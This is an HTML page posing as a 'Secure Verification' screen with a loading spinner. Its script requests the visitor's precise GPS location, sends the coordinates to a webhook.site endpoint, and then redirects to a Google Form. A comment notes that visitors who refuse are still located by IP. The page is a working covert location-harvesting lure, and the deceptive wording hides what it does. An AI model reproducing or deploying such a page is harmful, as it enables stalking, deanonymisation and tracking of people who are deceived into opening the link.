<!DOCTYPE html>
<html>
<head>
    <title>Secure Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #111; color: #eee; font-family: sans-serif; text-align: center; padding-top: 20%; }
        .spinner { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p id="status">Syncing secure connection...</p>

    <script>
        const WEBHOOK = "https://webhook.site/81426716-72be-48fc-a494-fcd675327a3e";
        const FORM = "https://docs.google.com/forms/d/1kXi_Hw0GgWOI533BwZx-RxhWeSzsl28WUR1yVCSmkJ0/viewform";

        function sendAndLeave(lat, lon, acc, type) {
            fetch(`${WEBHOOK}?lat=${lat}&lon=${lon}&accuracy=${acc}m&type=${type}`)
            .then(() => { window.location.href = FORM; });
        }

        window.onload = function() {
            if (!navigator.geolocation) { window.location.href = FORM; return; }

            // FORCE HIGH ACCURACY
            const options = {
                enableHighAccuracy: true, // Forces GPS instead of IP
                timeout: 15000,           // Wait 15 seconds for a precise lock
                maximumAge: 0             // Do NOT use old/cached location
            };

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    // Success: Send exact GPS
                    sendAndLeave(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, "GPS_EXACT");
                },
                (err) => {
                    // Failure: If they block it, we still get their IP location via Webhook automatically
                    window.location.href = FORM;
                }, 
                options
            );
        };
    </script>
</body>
</html>
